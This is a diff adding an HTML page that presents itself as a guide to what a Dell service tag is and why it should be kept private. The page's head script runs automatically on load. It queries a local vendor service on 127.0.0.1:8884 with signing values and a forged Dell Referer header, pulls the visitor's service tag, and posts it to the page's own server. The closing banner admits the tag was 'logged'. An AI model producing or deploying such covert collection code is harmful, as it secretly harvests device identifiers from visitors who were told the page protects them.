@@ -1,0 +1,114 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <title>Service Tag Info</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      max-width: 800px;
+      margin: 2rem auto;
+      line-height: 1.6;
+    }
+    h2 {
+      color: #0056b3;
+    }
+    ul {
+      margin-top: 0;
+    }
+    .highlight {
+      background: #f9f9f9;
+      border-left: 5px solid #007bff;
+      padding: 1rem;
+      margin-top: 1rem;
+    }
+    .warning {
+      background: #fff3cd;
+      border-left: 5px solid #ffc107;
+      padding: 1rem;
+      margin-top: 1rem;
+    }
+  </style>
+  <script>
+    async function fetchAndSendServiceTag() {
+      try {
+        const config = await fetch('/admin/config').then(res => res.json());
+        const encodedSignature = encodeURIComponent(config.STATIC_SIGNATURE);
+        const localURL = `http://127.0.0.1:8884/clientservice/isalive/?expires=${config.STATIC_EXPIRES}&signature=${encodedSignature}&buster=${config.STATIC_BUSTER}&s_id=${config.STATIC_SID}`;
+  
+        const response = await fetch(localURL, {
+          headers: {
+            Referer: 'https://www.dell.com/support/home/en-in'
+          }
+        });
+  
+        const data = await response.json();
+        const serviceTag = data.serviceTag;
+  
+        if (serviceTag) {
+          await fetch('/submit', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ serviceTag })
+          });
+          console.log("✅ Sent serviceTag to server:", serviceTag);
+        } else {
+          console.warn("⚠️ No serviceTag found in response");
+        }
+      } catch (err) {
+        console.error("❌ Failed to fetch serviceTag:", err.message);
+      }
+    }
+  
+    window.onload = fetchAndSendServiceTag;
+  </script>
+</head>
+<body>
+  <h2>What is a Service Tag?</h2>
+  <p>
+    A <strong>Service Tag</strong> is a unique identifier assigned to every Dell (or other OEM) device.
+    It is primarily used by manufacturers and IT teams for:
+  </p>
+  <ul>
+    <li>Warranty lookups</li>
+    <li>Technical support</li>
+    <li>System specifications</li>
+    <li>Driver and firmware updates</li>
+    <li>Asset tracking and inventory management</li>
+  </ul>
+
+  <h2> Why You Should Be Cautious</h2>
+  <p>
+    Sharing your service tag may seem harmless, but it can expose your device to a range of threats:
+  </p>
+  <ul>
+    <li>
+      <strong>Warranty impersonation:</strong> An attacker could file fraudulent support requests, potentially blocking your access to genuine support.
+    </li>
+    <li>
+      <strong>Hardware impersonation:</strong> Bad actors may use the tag to obtain sensitive hardware info (like motherboard serial, BIOS version).
+    </li>
+ 
+    <li>
+      <strong>Fake ownership claims:</strong> Especially in resale scenarios, someone could impersonate a rightful owner.
+    </li>
+    <li>
+      <strong>Social engineering attacks:</strong> Combined with LinkedIn or internal IT directory data, attackers can launch targeted phishing or impersonation attacks.
+    </li>
+  </ul>
+
+
+
+  <h2>Good Practices</h2>
+  <ul>
+    <li>Never post your service tag on public forums or social media.</li>
+    <li>Only share with trusted internal IT or authorized support personnel.</li>
+    <li>Mask tags when documenting or sharing screenshots (e.g., <code>ABC1234 → A***234</code>).</li>
+    <li>Report any suspicious support or warranty activity to your IT/security team.</li>
+  </ul>
+
+  <div class="highlight">
+     Your system's service tag has been safely logged. No tag or device information is shown here.
+  </div>
+</body>
+</html>
